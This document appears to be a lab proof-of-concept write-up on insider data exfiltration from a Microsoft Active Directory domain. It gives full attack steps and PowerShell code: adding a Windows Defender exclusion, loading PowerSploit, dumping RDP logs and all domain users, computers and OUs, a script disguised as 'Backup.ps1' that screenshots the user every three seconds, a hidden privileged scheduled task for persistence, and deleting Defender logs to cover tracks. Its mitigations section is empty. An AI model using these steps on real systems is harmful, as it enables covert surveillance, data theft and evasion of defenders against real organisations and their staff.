# POC 1 - Data Exfiltration from Microsoft’s Active Directory

## Description

The Microsoft Active Directory provides a directory service infrastructure that is able to help Organisations manage their resources throughout the network.

This directory service aims to provide a simplified and efficient systems administration by allowing users to consolidate user accounts, computer accounts, group accounts and more into objects and resources.

While this directory service provide a simplified manner of systems administration, it also provides threat actors with easy access to resource when misused.

This attack aims to outline the threats posed to the organisation from a data exfiltration threat  making use of both the PowerSploit module and PowerShell. 

## Machines Used

|Machine Name|Machine IP|Type of Machine|Domain|
|--|--|--|--|
|Windows Server 2022|192.168.8.10|Domain Controller|c4rr0ting.com|
|Windows 10 Client|192.168.8.11|Client|c4rr0ting.com|

## Users

|User Name|Domain|Group|
|--|--|--|
|CARR0T|c4rr0ting.com||
|Test|c4rr0ting.com||

## Steps to Carry Out Exploitation

There are a total of 3 steps to be caried out during the process of data exfiltration of the Microsoft Active Directory by either an insider or by an administrator with malicious intent. 

The following are the 3 steps taken during the POC.

1. [Preparation Phase](#preparations)
2. [Exploitation Phase](#exploitation)
3. [Covering Tracks Phase](#covering-tracks)

The preparation phase covers all preperatory needs inclusive of the installation of tools that can possibly prepared by the threat attacker. 

The exploitation phase outlines the steps that the insider can possibly take to both remain undetected within the machine along with achieving the targeted goal of the insider threat attacker.

The last phase which is the covering tracks phase will state how the attacker can possibly evade detection of having unauthorised access to resources and removing traces where alerts have been raised within the system.

### Preparations

1. Download the PowerSploit repository

```
https://github.com/PowerShellMafia/PowerSploit/releases/tag/v3.0.0 
```

![Download PowerSploit on GitHub](/images/POC_1/POC1_Downloading_PowerSploit.png)

2. Upload the PowerSploit folder into a thumbdrive or storage device

![Files within the directory](/images/POC_1/POC1_Folder_in_Storage_Device.png)

### Exploitation

1. Configure the Windows Defender as follows

```
Virus & Threat Protection > Virus & Threat Protection Settings > Manage Settings > Exclusions > Add or Remove Exclusions

Add Exclusion the following path

C:\Windows\System32\WindowsPowerShell
```

![Windows Security Configuration](/images/POC_1/POC1_Excluding_WindowsPowerShell_Folder.png)

2. Navigate to the following directory and upload the various folders within the PowerSploit folder
   
```
C:\Windows\System32\WindowsPowerShell\v1.0\Modules
```

![Uploaded folder within the directory](/images/POC_1/POC1_PowerSploit_in_Victim_Machine.png)

3. Execute the following PowerShell script below to extract the user data of all connections made 

```ps1
# Extracting user data from any connections users made towards the Windows Server through RDP

$RDPAuths = Get-WinEvent -LogName 'Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational' -FilterXPath '<QueryList><Query Id="0"><Select>*[System[EventID=1149]]</Select></Query></QueryList>'
[xml[]]$xml=$RDPAuths|Foreach{$_.ToXml()}
$EventData = Foreach ($event in $xml.Event)
{ New-Object PSObject -Property @{
TimeCreated = (Get-Date ($event.System.TimeCreated.SystemTime) -Format 'yyyy-MM-dd hh:mm:ss K')
User = $event.UserData.EventXML.Param1
Domain = $event.UserData.EventXML.Param2
Client = $event.UserData.EventXML.Param3
}
} $EventData | FT

# Extracting user data from connections users made towards other machines through the Windows Server using RDP

Import-Module Recon
$computerDetails = Get-ComputerDetails -ToString
$startIndex = $computerDetails.IndexOf('RDP Client Data:')
$rdpClientData = $computerDetails | Select-Object -Skip ($startIndex + 1)
Write-Host "RDP Client Data:"
$rdpClientData
```

4. Execute the following PowerShell script below to extract all users, computers and active directory information

```ps1
Import-Module ActiveDirectory

$username = [Environment]::UserName

# Output root folder path
$outputRootFolderPath = "C:\Users\$username\Documents\WindowsPowerShell\Scripts\Scripts\OU_Details"

# Create the output root folder if it doesn't exist
if (-not (Test-Path -Path $outputRootFolderPath -PathType Container)) {
    New-Item -Path $outputRootFolderPath -ItemType Directory | Out-Null
}

# Create file for all users within the domain
$allUsersFilePath = Join-Path -Path $outputRootFolderPath -ChildPath "AllUsers.txt"

if (-not (Test-Path -Path $allUsersFilePath)) {
    New-Item -Path $allUsersFilePath -ItemType File | Out-Null
}
else {
    # If file already exists, overwrite the content
    Set-Content -Path $allUsersFilePath -Value $null
}

# Create file for all computers within the domain
$allComputersFilePath = Join-Path -Path $outputRootFolderPath -ChildPath "AllComputers.txt"

if (-not (Test-Path -Path $allComputersFilePath)) {
    New-Item -Path $allComputersFilePath -ItemType File | Out-Null
}
else {
    # If file already exists, overwrite the content
    Set-Content -Path $allComputersFilePath -Value $null
}

# Get all users within the domain
$allUsers = Get-ADUser -Filter * | Select-Object Name, SamAccountName, DistinguishedName

# Display all users and write to file
Add-Content -Path $allUsersFilePath -Value "All Users within the Domain:"
$allUsers | Format-Table -AutoSize | Out-File -Append -FilePath $allUsersFilePath

# Get all computers within the domain
$allComputers = Get-ADComputer -Filter * | Select-Object Name, SamAccountName, DistinguishedName, ObjectGUID, SID

# Display all computers and write to file
Add-Content -Path $allComputersFilePath -Value "All Computers within the Domain:"
$allComputers | Format-Table -AutoSize | Out-File -Append -FilePath $allComputersFilePath

# Get all OUs
$ous = Get-ADOrganizationalUnit -Filter 'Name -like "*"' | Select-Object Name, DistinguishedName

# Iterate through each OU
foreach ($ou in $ous) {
    # Create folder for each OU
    $ouFolderPath = Join-Path -Path $outputRootFolderPath -ChildPath $ou.Name

    if (-not (Test-Path -Path $ouFolderPath -PathType Container)) {
        New-Item -Path $ouFolderPath -ItemType Directory | Out-Null
    }
    else {
        # If folder already exists, overwrite the content of the files
        Remove-Item (Join-Path -Path $ouFolderPath -ChildPath "OU_Properties.txt")
        Remove-Item (Join-Path -Path $ouFolderPath -ChildPath "OU_Users.txt")
    }

    # Create file for OU properties
    $ouPropertiesFilePath = Join-Path -Path $ouFolderPath -ChildPath "OU_Properties.txt"

    Add-Content -Path $ouPropertiesFilePath -Value "OU Name: $($ou.Name)"
    Add-Content -Path $ouPropertiesFilePath -Value "DistinguishedName: $($ou.DistinguishedName)"

    # Get settings of the OU
    $ouSettings = Get-ADObject -Filter "DistinguishedName -eq '$($ou.DistinguishedName)'" -Properties *

    # Display OU settings
    Add-Content -Path $ouPropertiesFilePath -Value "OU Settings:"
    $ouSettings | Format-Table -Property CanonicalName, CN, Created, createTimestamp, Deleted, Description, DisplayName, DistinguishedName, dSCorePropagationData, gPLink -AutoSize | Out-File -Append -FilePath $ouPropertiesFilePath
    Add-Content -Path $ouPropertiesFilePath -Value "-----------------------------------"

    # Get users within the OU
    $ouUsers = Get-ADUser -Filter * -SearchBase $ou.DistinguishedName

    # Create file for OU users
    $ouUsersFilePath = Join-Path -Path $ouFolderPath -ChildPath "OU_Users.txt"

    # Display users within the OU and write to file
    Add-Content -Path $ouUsersFilePath -Value "Users within the OU:"
    $ouUsers | Select-Object Name, SamAccountName, DistinguishedName | Format-Table -AutoSize | Out-File -Append -FilePath $ouUsersFilePath

    # Get computers within the OU
    $ouComputers = Get-ADComputer -Filter * -SearchBase $ou.DistinguishedName

    # Create file for OU computers
    $ouComputersFilePath = Join-Path -Path $ouFolderPath -ChildPath "OU_Computers.txt"

    # Display computers within the OU and write to file
    Add-Content -Path $ouComputersFilePath -Value "Computers within the OU:"
    $ouComputers | Select-Object Name, SamAccountName, DistinguishedName, ObjectGUID, SID | Format-Table -AutoSize | Out-File -Append -FilePath $ouComputersFilePath
}
```

5. Create a script with the following content and save it in a file locations where it will seem normal


File Location:

```
C:\Users\$username\Documents\WindowsPowerShell\Scripts\InstalledScriptInfos
```

File Name:

```
Backup.ps1
```

Script Content: 

```ps1
# Capture User's Screen Every 3 seconds

Import-Module Exfiltration

$username = [Environment]::UserName
$date = Get-Date -Format "dd-MM-yyyy"
$path = "C:\Users\$username\Documents\WindowsPowerShell\Scripts\Scripts\$date"


if (-not (Test-Path -Path $path -PathType Container)) {
    New-Item -Path $path -ItemType Directory -Force > $null
}

Get-TimedScreenshot -Path $path -Interval 3 -EndTime 18:00 
```

1. Open Task Scheduler and create a task with the following descriptions

**General Tab**
|Options|Value|
|--|--|
|Name|Backup PowerShell Modules|
|Description|A script to backup PowerShell Modules downloaded into the system|
|Use the user account|Default User Selected|
|When to Run|Run Whether user is logged on or not|
|Run with highest privileges|Checked|
|Configure for|Windows Server 2022|
|Hidden|Checked|

![Task Scheduler General Options](/images/POC_1/POC1_Task_Scheduler_General.png)

**New Trigger Tab**
|Options|Value|
|--|--|
|Begin the task|At Startup|
|Stop the task if it runs longer than|3 days|
|Enabled|Checked|

![Task Scheduler New Trigger Options](/images/POC_1/POC1_Task_Scheduler_New_Trigger.png)

**New Action Tab**
|Options|Value|
|--|--|
|Action|Start a program|
|Program/script|C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe|
|Add arguments (optional)|-WindowStyle hidden -File "C:\Users\CARR0T\Documents\WindowsPowerShell\Scripts\InstalledScriptInfos\Backup.ps1"|

![Task Scheduler New Actions Options](/images/POC_1/POC1_Task_Scheduler_New_Actions.png)

**Conditions Tab**
|Options|Value|
|--|--|
|Start the task only if the computer is on AC power|Unchecked|

![Task Scheduler Condition Options](/images/POC_1/POC1_Task_Scheduler_Conditions.png)

**Settings Tab**
|Options|Value|
|--|--|
|Allow Task to be run on demand|Checked|
|Run tasks as soon as possible after a scheduled start is missed|Checked|
|If the task fails, restart every|1 minute|
|Attempt to restart up to|3 times|
|Stop the task if it runs longer than|3 days|
|If the running task does not end when requested, force it to stop|Checked|
|If the task is not scheduled to run again, delete it after|Unchecked|
|If the task is already running, than the following rules applies|Do not start a new instance|

![Task Scheduler Settings Options](/images/POC_1/POC1_Task_Scheduler_Settings.png)

2. Run the task

3. Notice that the task is running and there are no PowerShell Windows open

![Script Executing in Background](/images/POC_1/POC1_PowerShell_Hidden_Task_Running.png)

### Covering Tracks

1. Remove the Windows Defender logs by navigating to the following path

```
C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service
```

![Windows Defender Logs](/images/POC_1/POC1_Windows_Defender_Logs.png)

2. Select all files within the folder and delete the files

```
**NOTE**

If the file cannot be deleted, Manually clear the file content and save the file
```

![Cleared Windows Defenders Log](/images/POC_1/POC1_Windows_Defender_Logs_Cleared.png)


## Possible Mitigations



## References

https://github.com/PowerShellMafia/PowerSploit
https://answers.microsoft.com/en-us/windows/forum/all/how-to-remove-a-protection-history-report-from/c73c5969-68fe-454e-833f-b602af0b175d
https://woshub.com/rdp-connection-logs-forensics-windows/
